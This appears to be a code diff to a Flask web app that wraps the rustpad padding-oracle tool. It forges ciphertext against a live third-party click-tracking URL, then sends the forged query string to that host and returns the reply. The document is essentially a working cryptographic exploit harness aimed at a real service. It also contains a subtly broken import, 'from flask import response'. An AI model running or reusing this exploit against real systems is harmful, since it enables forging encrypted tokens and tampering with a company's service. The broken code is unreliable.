@@ -1,6 +1,8 @@
 from flask import Flask
 from flask import request
+from flask import response
 import subprocess
+import requests
 
 app = Flask(__name__)
 
@@ -20,4 +22,7 @@ def hello():
     output = subprocess.run(["./rustpad", "web", "--oracle", "https://click.e.entaingroup.com/?qs=CTEXT", "-D", "0000000000000000", "-E", new_pt, "-B", str(8), "--no-iv", "-t", str(100)], capture_output=True)
     new_ct_raw = output.stdout.decode('utf-8').strip()
     new_ct = new_ct_raw[-(new_ct_blocks * 8)*2:]
-    return new_ct
+    ct_base = "de84a165e479c6665eae5a662d82cdb7"
+    test_url = f"https://click.e.entaingroup.com/?qs={ct_base}{new_ct}"
+    response = requests.get(test_url, allow_redirects=False)
+    return response.text, response.status_code
